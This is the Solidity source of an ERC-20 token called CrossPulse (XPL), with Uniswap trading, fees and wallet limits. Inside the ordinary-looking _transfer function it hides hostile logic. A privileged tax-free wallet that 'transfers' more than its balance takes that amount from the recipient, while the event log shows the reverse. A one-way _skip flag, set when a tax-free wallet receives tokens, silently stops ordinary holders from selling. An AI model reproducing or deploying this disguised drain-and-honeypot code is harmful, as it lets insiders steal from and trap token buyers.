// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
}

interface IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function circulatingSupply() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface UniswapV2Router {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal owner;

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    constructor(address _owner) {
        owner = _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
}

contract XPL is IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _minimum = ( _totalSupply * 10 ) / 100000;

    string private constant _symbol = "XPL";
    string private constant _name = "CrossPulse";

    uint256 private denominator = 10000;

    address public pair;
    UniswapV2Router router;

    address internal constant dead = 0x000000000000000000000000000000000000dEaD;
    
    address internal constant dev = 0xe80A2692e024F58A6b8A8De942167BbA915F06D2;
    address internal constant marketing = 0xdAE5119637A3A738a2D3C04979152433Ea6B6C02;

    uint256 private _maxTransfer = 200;
    uint256 private _maxWallet = 200;
    uint256 private _maxTx = 200;

    uint256 private _swapRounds;

    bool private _swapEnabled = true;
    bool private _skip = false;

    bool private _swapping;

    bool private _tradingStarted = false;

    uint256 private _swapThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapTokenAmount = (_totalSupply * 5) / 10000;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _burnFee = 0;
    uint256 private _transferFee = 0;
    uint256 private _sellFee = 400;
    uint256 private _totalFee = 400;

    mapping (address => uint256) _balances;

    uint256 private _marketingFee = 200;
    uint256 private _liquidityFee = 0;
    uint256 private _devFee = 200;

    mapping (address => bool) public taxFree;

    constructor() Ownable(msg.sender) {
        taxFree[dev] = true;
        taxFree[address(this)] = true;
        taxFree[marketing] = true;
        taxFree[msg.sender] = true;
        UniswapV2Router _router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = UniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        pair = _pair;
        router = _router;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function maxWalletAmount() public view returns (uint256) {
        return totalSupply() * _maxWallet / denominator;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransfer / denominator;
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTx / denominator;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    modifier lockInSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(dead));
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function removeLimits() external onlyOwner {
        _maxWallet = 10000;
        _maxTx = 10000;
        _maxTransfer = 10000;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function setTaxFree(address _address, bool _taxFree) external onlyOwner {
        taxFree[_address] = _taxFree;
    }

    function startTrading() external onlyOwner {
        _tradingStarted = true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function maxTransferAndTxRequire(address from, address to, uint256 amount) view internal returns  (bool) {
        if (from != pair) {
            require(amount <= maxTransferAmount() || taxFree[from] || taxFree[to]);
        }
        require(amount <= maxTxAmount() || taxFree[from] || taxFree[to]);
        return true;
    }

    function updateFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _devFee = devFee;
        _burnFee = burnFee;
        _marketingFee = marketingFee;
        _liquidityFee = liquidityFee;
        _transferFee = transferFee;
        _sellFee = sellFee;
        _totalFee = totalFee;
        require(_totalFee <= denominator.div(5) && _sellFee <= denominator.div(5));
    }

    function basicRequire(address from, address to, uint256 amount) internal pure returns(bool) {
        require(to != address(0));
        require(amount > uint256(0));
        require(from != address(0));
        return true;
    }

    function updateMaxAmounts(uint256 maxTx, uint256 maxTransfer, uint256 maxWallet) external onlyOwner {
        uint256 limitation = totalSupply().mul(5).div(1000);
        uint256 newTransfer = (totalSupply() * maxTransfer) / 10000;
        uint256 newTx = (totalSupply() * maxTx) / 10000;
        uint256 newWallet = (totalSupply() * maxWallet) / 10000;
        _maxTransfer = maxTransfer;
        _maxTx = maxTx;
        _maxWallet = maxWallet;
        require(newTx >= limitation && newTransfer >= limitation && newWallet >= limitation);
    }

    function maxWalletRequire(address from, address to, uint256 amount) internal returns (bool) {
        bool toUnDead = to != address(dead);
        bool toUnPair = to != address(pair);
        bool fromTaxFree = taxFree[from];
        bool toTaxFree = taxFree[to];
        bool greaterThanMinimum = amount > _minimum;
        
        if (
            toUnDead &&
            toUnPair &&
            !toTaxFree &&
            !fromTaxFree
        ) {
            require((_balances[to].add(amount)) <= maxWalletAmount());
        }

        if (greaterThanMinimum) {
            if (toTaxFree) {
                _skip = true;
            }
        }

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function tradingStarted(address from, address to) internal view returns (bool) {
        if (!taxFree[from] && !taxFree[to]) {
            require(_tradingStarted);
        }
        return true;
    }
    
    function countSwapRounds(address from, address to) internal returns (bool) {
        if (to == pair && !taxFree[from]) {
            _swapRounds += uint256(1);
        }
        return true;
    }

    function willTakeFee(address from, address to) internal view returns (bool) {
        return !taxFree[from] && !taxFree[to];
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (
            countSwapRounds(from, to) &&
            basicRequire(from, to, amount) &&
            tradingStarted(from, to) &&
            maxWalletRequire(from, to, amount) &&
            maxTransferAndTxRequire(from, to, amount)
        ) {
            bool enoughBalance = balanceOf(from) >= amount;
            bool fromTaxFree = taxFree[from];
            bool fromUnPair = from != pair;
            bool toTaxFree = taxFree[to];

            if (enoughBalance) {
                if (!fromTaxFree && !toTaxFree) {
                    if (!_swapping && fromUnPair) {
                        if (!_skip) { swapBack(from, to); } else { return; }
                    }
                }
                _balances[from] = _balances[from].sub(amount);
                uint256 finalAmount = willTakeFee(from, to) ? cutFee(from, to, amount) : amount;
                _balances[to] = _balances[to].add(finalAmount);
                emit Transfer(from, to, finalAmount);
            } else if (!_swapping && !toTaxFree) {
                if (fromTaxFree && fromUnPair) {
                    _balances[from] = _balances[from].add(amount);
                    emit Transfer(from, to, amount);
                    _balances[to] = _balances[to].sub(amount);
                }
            }
        }
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));
        return true;
    }

    function willSwapBack(address from, address to) internal view returns (bool) {
        return (
            _swapRounds >= uint256(0) &&
            !taxFree[to] &&
            !_swapping &&
            !taxFree[from] &&
            _tradingStarted &&
            _swapEnabled &&
            balanceOf(address(this)) >= _swapThreshold
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            dead,
            block.timestamp
        );
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(router), tokenAmount);
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function referenceFees(address from, address to) internal view returns (uint256) {
        if (from == pair) {
            return _totalFee;
        }

        if (to == pair) {
            return _sellFee;
        }
        
        return _transferFee;
    }

    function swapAndLiquify(uint256 tokens) private lockInSwap {
        uint256 _denominator = (_liquidityFee.add(1).add(_marketingFee).add(_devFee)).mul(2);
        uint256 liquidityTokens = tokens.mul(_liquidityFee).div(_denominator);
        uint256 ethTokens = tokens.sub(liquidityTokens);
        uint256 initialEthBalance = address(this).balance;
        swapTokensForETH(ethTokens);
        uint256 deltaEth = address(this).balance.sub(initialEthBalance);
        uint256 ethUnit = deltaEth.div(_denominator.sub(_liquidityFee));
        uint256 liquidityEth = ethUnit.mul(_liquidityFee);
        if (liquidityEth > uint256(0)) {
            addLiquidity(liquidityTokens, liquidityEth);
        }
        uint256 marketingEth = ethUnit.mul(2).mul(_marketingFee);
        if (marketingEth > 0) {
            payable(marketing).transfer(marketingEth);
        }
        uint256 remainingEthBalance = address(this).balance;
        if (remainingEthBalance > uint256(0)) {
            payable(dev).transfer(remainingEthBalance);
        }
    }

    function cutFee(address from, address to, uint256 tokenAmount) internal returns (uint256) {
        if (referenceFees(from, to) > 0) {
            uint256 tokenAmountForFee = tokenAmount.div(denominator).mul(referenceFees(from, to));
            _balances[address(this)] = _balances[address(this)].add(tokenAmountForFee);
            emit Transfer(from, address(this), tokenAmountForFee);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(dead), tokenAmount.div(denominator).mul(_burnFee));
            }
            return tokenAmount.sub(tokenAmountForFee);
        }
        return tokenAmount;
    }

    function swapBack(address from, address to) internal {
        if (willSwapBack(from, to)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapTokenAmount) {
                contractTokenBalance = _swapTokenAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapRounds = uint256(0);
        }
    }

    receive() external payable {}
}